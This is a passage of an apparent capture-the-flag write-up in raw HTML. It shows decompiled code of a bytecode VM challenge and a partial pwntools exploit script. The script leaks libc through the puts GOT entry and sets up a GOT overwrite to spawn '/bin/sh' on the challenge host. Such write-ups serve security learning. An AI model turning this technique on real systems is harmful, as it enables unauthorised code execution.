v5; <span class="comment">// ST1D_1</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// ST1E_1</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v7; <span class="comment">// ST1F_1</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 *v8; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v9; <span class="comment">// ST22_1</span></span><br><span class="line">  _BYTE *v10; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 *v11; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 *v12; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v13; <span class="comment">// ST24_1</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 *v14; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v15; <span class="comment">// ST27_1</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 *v16; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v17; <span class="comment">// ST2A_1</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 *v18; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v19; <span class="comment">// ST2D_1</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 *v20; <span class="comment">// eax</span></span><br><span class="line">  node *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v22; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v23; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v24; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v25; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v26; <span class="comment">// [esp+21h] [ebp-27h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v27; <span class="comment">// [esp+22h] [ebp-26h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v28; <span class="comment">// [esp+23h] [ebp-25h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v29; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )                               <span class="comment">// 0x0*</span></span><br><span class="line">      &#123;</span><br><span class="line">        choice = *(_BYTE *)node_addr-&gt;malloc_addr &amp; <span class="number">0xF0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( choice != <span class="number">0x70</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( *(_BYTE *)node_addr-&gt;malloc_addr &amp; <span class="number">0xF</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (*(_BYTE *)node_addr-&gt;malloc_addr &amp; <span class="number">0xF</span>) != <span class="number">3</span> )<span class="comment">// 0xf3</span></span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">          node_addr-&gt;calloc_addr_fc -= <span class="number">4</span>;</span><br><span class="line">          *(_DWORD *)node_addr-&gt;calloc_addr_fc = *(_DWORD *)(node_addr-&gt;malloc_addr + <span class="number">1</span>);</span><br><span class="line">          node_addr-&gt;malloc_addr += <span class="number">5</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>                                    <span class="comment">// 0xf0</span></span><br><span class="line">        &#123;</span><br><span class="line">          node_addr-&gt;calloc_addr_fc -= <span class="number">4</span>;</span><br><span class="line">          *(_DWORD *)node_addr-&gt;calloc_addr_fc = *(&amp;node_addr-&gt;idx0 + *(<span class="keyword">unsigned</span> __int8 *)GetReg(node_addr, <span class="number">1u</span>));</span><br><span class="line">          node_addr-&gt;malloc_addr += <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( choice &gt; <span class="number">0x70</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( choice == <span class="number">0x30</span> )                     <span class="comment">// 0x30</span></span><br><span class="line">      &#123;</span><br><span class="line">        v12 = (<span class="keyword">unsigned</span> __int8 *)GetReg(node_addr, <span class="number">1u</span>);</span><br><span class="line">        --*(&amp;node_addr-&gt;idx0 + *v12);</span><br><span class="line">        node_addr-&gt;malloc_addr += <span class="number">2</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( choice &gt; <span class="number">0x30</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">switch</span> ( choice )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">0x50</span>:</span><br><span class="line">            <span class="keyword">if</span> ( *(_BYTE *)node_addr-&gt;malloc_addr &amp; <span class="number">0xF</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( (*(_BYTE *)node_addr-&gt;malloc_addr &amp; <span class="number">0xF</span>) != <span class="number">3</span> )</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">              v18 = (<span class="keyword">unsigned</span> __int8 *)GetReg(node_addr, <span class="number">1u</span>);<span class="comment">// 0x53</span></span><br><span class="line">              *(&amp;node_addr-&gt;idx0 + *v18) -= *(_DWORD *)(node_addr-&gt;malloc_addr + <span class="number">2</span>);</span><br><span class="line">              node_addr-&gt;malloc_addr += <span class="number">6</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              v17 = *(_BYTE *)GetReg(node_addr, <span class="number">1u</span>);<span class="comment">// 0x50-&gt;Sub</span></span><br><span class="line">              *(&amp;node_addr-&gt;idx0 + v17) -= *(&amp;node_addr-&gt;idx0 + *(<span class="keyword">unsigned</span> __int8 *)GetReg(node_addr, <span class="number">2u</span>));</span><br><span class="line">              node_addr-&gt;malloc_addr += <span class="number">3</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">0x60</span>:</span><br><span class="line">            <span class="keyword">if</span> ( *(_BYTE *)node_addr-&gt;malloc_addr &amp; <span class="number">0xF</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( (*(_BYTE *)node_addr-&gt;malloc_addr &amp; <span class="number">0xF</span>) != <span class="number">3</span> )</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">              v20 = (<span class="keyword">unsigned</span> __int8 *)GetReg(node_addr, <span class="number">1u</span>);<span class="comment">// 0x63-&gt;Mul</span></span><br><span class="line">              *(&amp;node_addr-&gt;idx0 + *v20) *= *(_DWORD *)(node_addr-&gt;malloc_addr + <span class="number">2</span>);</span><br><span class="line">              node_addr-&gt;malloc_addr += <span class="number">6</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              v19 = *(_BYTE *)GetReg(node_addr, <span class="number">1u</span>);</span><br><span class="line">              *(&amp;node_addr-&gt;idx0 + v19) *= *(&amp;node_addr-&gt;idx0 + *(<span class="keyword">unsigned</span> __int8 *)GetReg(node_addr, <span class="number">2u</span>));</span><br><span class="line">              node_addr-&gt;malloc_addr += <span class="number">3</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">0x40</span>:</span><br><span class="line">            <span class="keyword">if</span> ( *(_BYTE *)node_addr-&gt;malloc_addr &amp; <span class="number">0xF</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( (*(_BYTE *)node_addr-&gt;malloc_addr &amp; <span class="number">0xF</span>) != <span class="number">3</span> )</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">              v14 = (<span class="keyword">unsigned</span> __int8 *)GetReg(node_addr, <span class="number">1u</span>);<span class="comment">// 0x43-&gt;Add</span></span><br><span class="line">              *(&amp;node_addr-&gt;idx0 + *v14) += *(_DWORD *)(node_addr-&gt;malloc_addr + <span class="number">2</span>);</span><br><span class="line">              node_addr-&gt;malloc_addr += <span class="number">6</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              v13 = *(_BYTE *)GetReg(node_addr, <span class="number">1u</span>);</span><br><span class="line">              *(&amp;node_addr-&gt;idx0 + v13) += *(&amp;node_addr-&gt;idx0 + *(<span class="keyword">unsigned</span> __int8 *)GetReg(node_addr, <span class="number">2u</span>));</span><br><span class="line">              node_addr-&gt;malloc_addr += <span class="number">3</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">goto</span> LABEL_121;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( choice == <span class="number">0x10</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *(_BYTE *)(node_addr-&gt;malloc_addr + <span class="number">1</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( *(_BYTE *)(node_addr-&gt;malloc_addr + <span class="number">1</span>) != <span class="number">1</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">          <span class="built_in">putchar</span>(*(<span class="keyword">char</span> *)node_addr-&gt;idx3);    <span class="comment">// 0x10-&gt;show</span></span><br><span class="line">          node_addr-&gt;malloc_addr += <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v10 = (_BYTE *)node_addr-&gt;idx3;</span><br><span class="line">          *v10 = getchar();</span><br><span class="line">          node_addr-&gt;malloc_addr += <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( choice == <span class="number">0x20</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v11 = (<span class="keyword">unsigned</span> __int8 *)GetReg(node_addr, <span class="number">1u</span>);</span><br><span class="line">        ++*(&amp;node_addr-&gt;idx0 + *v11);           <span class="comment">// 0x20-&gt;++</span></span><br><span class="line">        node_addr-&gt;malloc_addr += <span class="number">2</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *(_BYTE *)node_addr-&gt;malloc_addr &amp; <span class="number">0xF0</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_121;</span><br><span class="line">        <span class="keyword">if</span> ( *(_BYTE *)node_addr-&gt;malloc_addr &amp; <span class="number">0xF</span> )<span class="comment">// 0x0*</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">switch</span> ( *(_BYTE *)node_addr-&gt;malloc_addr &amp; <span class="number">0xF</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">              v3 = *(_BYTE *)GetReg(node_addr, <span class="number">1u</span>);</span><br><span class="line">              v4 = (<span class="keyword">unsigned</span> __int8 *)GetReg(node_addr, <span class="number">2u</span>);</span><br><span class="line">              *(&amp;node_addr-&gt;idx0 + v3) = *(_DWORD *)GetNewHeapAddr(</span><br><span class="line">                                                      node_addr,</span><br><span class="line">                                                      *v4,</span><br><span class="line">                                                      *(<span class="keyword">char</span> *)(node_addr-&gt;malloc_addr + <span class="number">3</span>));</span><br><span class="line">              node_addr-&gt;malloc_addr += <span class="number">4</span>;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">              v5 = *(_BYTE *)GetReg(node_addr, <span class="number">1u</span>);</span><br><span class="line">              v6 = *(_BYTE *)(node_addr-&gt;malloc_addr + <span class="number">2</span>);</span><br><span class="line">              v7 = *(_BYTE *)GetReg(node_addr, <span class="number">3u</span>);</span><br><span class="line">              *(_DWORD *)GetNewHeapAddr(node_addr, v5, v6) = *(&amp;node_addr-&gt;idx0 + v7);</span><br><span class="line">              node_addr-&gt;malloc_addr += <span class="number">4</span>;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">              v8 = (<span class="keyword">unsigned</span> __int8 *)GetReg(node_addr, <span class="number">1u</span>);</span><br><span class="line">              v9 = *(_DWORD *)(node_addr-&gt;malloc_addr + <span class="number">3</span>);</span><br><span class="line">              *(_DWORD *)GetNewHeapAddr(node_addr, *v8, *(<span class="keyword">char</span> *)(node_addr-&gt;malloc_addr + <span class="number">2</span>)) = v9;</span><br><span class="line">              node_addr-&gt;malloc_addr += <span class="number">7</span>;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">              <span class="keyword">if</span> ( (*(_BYTE *)node_addr-&gt;malloc_addr &amp; <span class="number">0xF</span>) != <span class="number">3</span> )</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">              *(&amp;node_addr-&gt;idx0 + *(<span class="keyword">unsigned</span> __int8 *)GetReg(node_addr, <span class="number">1u</span>)) = *(_DWORD *)(node_addr-&gt;malloc_addr + <span class="number">2</span>);</span><br><span class="line">              node_addr-&gt;malloc_addr += <span class="number">6</span>;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v2 = *(_BYTE *)GetReg(node_addr, <span class="number">1u</span>);</span><br><span class="line">          *(&amp;node_addr-&gt;idx0 + v2) = *(&amp;node_addr-&gt;idx0 + *(<span class="keyword">unsigned</span> __int8 *)GetReg(node_addr, <span class="number">2u</span>));</span><br><span class="line">          node_addr-&gt;malloc_addr += <span class="number">3</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( choice == <span class="number">0xB0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( choice &gt; <span class="number">0xB0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( choice == <span class="number">0xD0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *(_BYTE *)node_addr-&gt;malloc_addr &amp; <span class="number">0xF</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (*(_BYTE *)node_addr-&gt;malloc_addr &amp; <span class="number">0xF</span>) != <span class="number">3</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">          v28 = *(_BYTE *)GetReg(node_addr, <span class="number">1u</span>);<span class="comment">// 0xd3</span></span><br><span class="line">          v29 = *(_DWORD *)(node_addr-&gt;malloc_addr + <span class="number">2</span>);</span><br><span class="line">          node_addr-&gt;idx9 = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">if</span> ( *(&amp;node_addr-&gt;idx0 + v28) == v29 )</span><br><span class="line">            node_addr-&gt;idx9 |= <span class="number">0x100000</span>u;</span><br><span class="line">          <span class="keyword">if</span> ( *(&amp;node_addr-&gt;idx0 + v28) &gt; v29 )</span><br><span class="line">            node_addr-&gt;idx9 |= <span class="number">0x80000</span>u;</span><br><span class="line">          <span class="keyword">if</span> ( *(&amp;node_addr-&gt;idx0 + v28) &lt; v29 )</span><br><span class="line">            node_addr-&gt;idx9 |= <span class="number">0x40000</span>u;</span><br><span class="line">          node_addr-&gt;malloc_addr += <span class="number">6</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v26 = *(_BYTE *)(node_addr-&gt;malloc_addr + <span class="number">1</span>);<span class="comment">// 0xd0</span></span><br><span class="line">          v27 = *(_BYTE *)(node_addr-&gt;malloc_addr + <span class="number">2</span>);</span><br><span class="line">          node_addr-&gt;idx9 = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">if</span> ( *(&amp;node_addr-&gt;idx0 + v26) == *(&amp;node_addr-&gt;idx0 + v27) )</span><br><span class="line">            node_addr-&gt;idx9 |= <span class="number">0x100000</span>u;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)*(&amp;node_addr-&gt;idx0 + v26) &gt; *(&amp;node_addr-&gt;idx0 + v27) )</span><br><span class="line">            node_addr-&gt;idx9 |= <span class="number">0x80000</span>u;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)*(&amp;node_addr-&gt;idx0 + v26) &lt; *(&amp;node_addr-&gt;idx0 + v27) )</span><br><span class="line">            node_addr-&gt;idx9 |= <span class="number">0x40000</span>u;</span><br><span class="line">          node_addr-&gt;malloc_addr += <span class="number">3</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( choice == <span class="number">0xF0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *(_BYTE *)node_addr-&gt;malloc_addr &amp; <span class="number">0xF</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">switch</span> ( *(_BYTE *)node_addr-&gt;malloc_addr &amp; <span class="number">0xF</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">              <span class="keyword">if</span> ( node_addr-&gt;idx9 &amp; <span class="number">0x100000</span> )</span><br><span class="line">                v23 = node_addr-&gt;malloc_addr + <span class="number">2</span>;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                v23 = *(<span class="keyword">char</span> *)(node_addr-&gt;malloc_addr + <span class="number">1</span>) + node_addr-&gt;malloc_addr;</span><br><span class="line">              node_addr-&gt;malloc_addr = v23;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">              <span class="keyword">if</span> ( node_addr-&gt;idx9 &amp; <span class="number">0x80000</span> )</span><br><span class="line">                v24 = *(<span class="keyword">char</span> *)(node_addr-&gt;malloc_addr + <span class="number">1</span>) + node_addr-&gt;malloc_addr;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                v24 = node_addr-&gt;malloc_addr + <span class="number">2</span>;</span><br><span class="line">              node_addr-&gt;malloc_addr = v24;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">              <span class="keyword">if</span> ( node_addr-&gt;idx9 &amp; <span class="number">0x40000</span> )</span><br><span class="line">                v25 = *(<span class="keyword">char</span> *)(node_addr-&gt;malloc_addr + <span class="number">1</span>) + node_addr-&gt;malloc_addr;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                v25 = node_addr-&gt;malloc_addr + <span class="number">2</span>;</span><br><span class="line">              node_addr-&gt;malloc_addr = v25;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">              <span class="keyword">if</span> ( node_addr-&gt;idx9 &amp; <span class="number">0x100000</span> || node_addr-&gt;idx9 &amp; <span class="number">0x80000</span> )</span><br><span class="line">                node_addr-&gt;malloc_addr += *(<span class="keyword">char</span> *)(node_addr-&gt;malloc_addr + <span class="number">1</span>);</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                node_addr-&gt;malloc_addr += <span class="number">2</span>;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">              <span class="keyword">if</span> ( node_addr-&gt;idx9 &amp; <span class="number">0x100000</span> || node_addr-&gt;idx9 &amp; <span class="number">0x40000</span> )</span><br><span class="line">                node_addr-&gt;malloc_addr += *(<span class="keyword">char</span> *)(node_addr-&gt;malloc_addr + <span class="number">1</span>);</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                node_addr-&gt;malloc_addr += <span class="number">2</span>;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">              <span class="keyword">if</span> ( (*(_BYTE *)node_addr-&gt;malloc_addr &amp; <span class="number">0xF</span>) != <span class="number">7</span> )</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">              node_addr-&gt;malloc_addr += *(_DWORD *)(node_addr-&gt;malloc_addr + <span class="number">1</span>);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( node_addr-&gt;idx9 &amp; <span class="number">0x100000</span> )</span><br><span class="line">            v22 = *(<span class="keyword">char</span> *)(node_addr-&gt;malloc_addr + <span class="number">1</span>) + node_addr-&gt;malloc_addr;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            v22 = node_addr-&gt;malloc_addr + <span class="number">2</span>;</span><br><span class="line">          node_addr-&gt;malloc_addr = v22;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( choice != <span class="number">0xC0</span> )</span><br><span class="line">LABEL_121:</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        node_addr-&gt;malloc_addr += *(<span class="keyword">char</span> *)(node_addr-&gt;malloc_addr + <span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> ( choice )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x90</span>:</span><br><span class="line">          ++node_addr-&gt;malloc_addr;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xA0</span>:</span><br><span class="line">          <span class="keyword">if</span> ( *(_BYTE *)node_addr-&gt;malloc_addr &amp; <span class="number">0xF</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( (*(_BYTE *)node_addr-&gt;malloc_addr &amp; <span class="number">0xF</span>) != <span class="number">3</span> )</span><br><span class="line">              <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">            v16 = (<span class="keyword">unsigned</span> __int8 *)GetReg(node_addr, <span class="number">1u</span>);</span><br><span class="line">            *(&amp;node_addr-&gt;idx0 + *v16) &amp;= *(_DWORD *)(node_addr-&gt;malloc_addr + <span class="number">2</span>);</span><br><span class="line">            node_addr-&gt;malloc_addr += <span class="number">6</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v15 = *(_BYTE *)GetReg(node_addr, <span class="number">1u</span>);</span><br><span class="line">            *(&amp;node_addr-&gt;idx0 + v15) &amp;= *(&amp;node_addr-&gt;idx0 + *(<span class="keyword">unsigned</span> __int8 *)GetReg(node_addr, <span class="number">2u</span>));</span><br><span class="line">            node_addr-&gt;malloc_addr += <span class="number">3</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x80</span>:</span><br><span class="line">          *(&amp;node_addr-&gt;idx0 + *(<span class="keyword">unsigned</span> __int8 *)GetReg(node_addr, <span class="number">1u</span>)) = *(_DWORD *)node_addr-&gt;calloc_addr_fc;</span><br><span class="line">          node_addr-&gt;calloc_addr_fc += <span class="number">4</span>;</span><br><span class="line">          node_addr-&gt;malloc_addr += <span class="number">2</span>;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="keyword">goto</span> LABEL_121;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  result = node_addr;</span><br><span class="line">  ++node_addr-&gt;malloc_addr;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="exp-py-3"><a href="#exp-py-3" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'i386'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./pwn'</span>)</span><br><span class="line">    gadgets = [<span class="number">0x3ac5c</span>,<span class="number">0x3ac5e</span>,<span class="number">0x3ac62</span>,<span class="number">0x3ac69</span>,<span class="number">0x5fbc5</span>,<span class="number">0x5fbc6</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    gadgets = [<span class="number">0x3a80c</span>,<span class="number">0x3a80e</span>,<span class="number">0x3a812</span>,<span class="number">0x3a819</span>,<span class="number">0x5f065</span>,<span class="number">0x5f066</span>]</span><br><span class="line">    libc = ELF(<span class="string">'./x86_libc.so.6'</span>)</span><br><span class="line">    p = remote(<span class="string">'f.buuoj.cn'</span>,<span class="number">20171</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">New</span><span class="params">(payload)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Play</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Free</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line"></span><br><span class="line">    payload = p8(<span class="number">0x43</span>)+p8(<span class="number">3</span>)+p32(elf.got[<span class="string">'puts'</span>])</span><br><span class="line">    payload += p8(<span class="number">0x10</span>)+p8(<span class="number">0x1</span>)</span><br><span class="line">    payload += p8(<span class="number">0x43</span>)+p8(<span class="number">3</span>)+p32(<span class="number">1</span>)</span><br><span class="line">    payload += p8(<span class="number">0x10</span>)+p8(<span class="number">0x1</span>)</span><br><span class="line">    payload += p8(<span class="number">0x43</span>)+p8(<span class="number">3</span>)+p32(<span class="number">1</span>)</span><br><span class="line">    payload += p8(<span class="number">0x10</span>)+p8(<span class="number">0x1</span>)</span><br><span class="line">    payload += p8(<span class="number">0x43</span>)+p8(<span class="number">3</span>)+p32(<span class="number">1</span>)</span><br><span class="line">    payload += p8(<span class="number">0x10</span>)+p8(<span class="number">0x1</span>)</span><br><span class="line">    payload += p8(<span class="number">0xb0</span>)</span><br><span class="line">    New(payload)</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Play()</span><br><span class="line">    libc_base = u32(p.recvn(<span class="number">4</span>)) - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">    system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">    log.success(<span class="string">"libc base =&gt; "</span> + hex(libc_base))</span><br><span class="line">    Free()</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    payload = p8(<span class="number">0x43</span>)+p8(<span class="number">0</span>)+p32(<span class="number">0x6e69622f</span>)</span><br><span class="line">    payload += p8(<span class="number">0x43</span>)+p8(<span class="number">1</span>)+p32(<span class="number">0x0068732f</span>)</span><br><span class="line">    payload += p8(<span class="number">0x43</span>)+p8(<span class="number">3</span>)+p32(elf.got[<span class="string">'free'</span>])</span><br><span class="line">    payload += p8(<span class="number">0x10</span>)+p8(<span class="number">0</span>)</span><br><span class="line">    payload += p8(<span class="number">0x43</span>)+p8(<span class="number">3</span>)+p32(<span class="number">1</span>)</span><br><span class="line">    payload += p8(<span class="number">0x10</span>)+p8(<span 